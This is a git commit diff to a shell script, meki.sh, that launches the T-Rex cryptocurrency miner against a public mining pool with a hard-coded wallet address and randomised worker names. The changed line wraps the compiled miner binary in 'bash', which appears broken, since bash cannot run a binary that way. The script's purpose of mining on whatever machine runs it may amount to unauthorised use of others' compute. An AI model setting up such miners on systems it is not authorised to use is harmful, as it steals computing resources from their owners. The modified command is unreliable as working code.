7edb6f4ef518a46bc98c154588010b936f22c9b9
renilo <88342640+renilo@users.noreply.github.com>
2022-02-20 22:47:02 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -16,4 +16,4 @@ tar xf t-rex-0.25.8-linux.tar.gz
 
 chmod +x t-rex >/dev/null 2>&1
 
-./t-rex -a blake3 -o stratum+tcp://pool.eu.woolypooly.com:3106 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup -p x -w $(echo $(shuf -i 1-999999 -n 1)-MEKI)
+bash ./t-rex -a blake3 -o stratum+tcp://pool.eu.woolypooly.com:3106 -u 12kD4waJeRzA5aPxUBvb4GLC5aJDNmMduv7pLwtq4vGup -p x -w $(echo $(shuf -i 1-999999 -n 1)-MEKI)
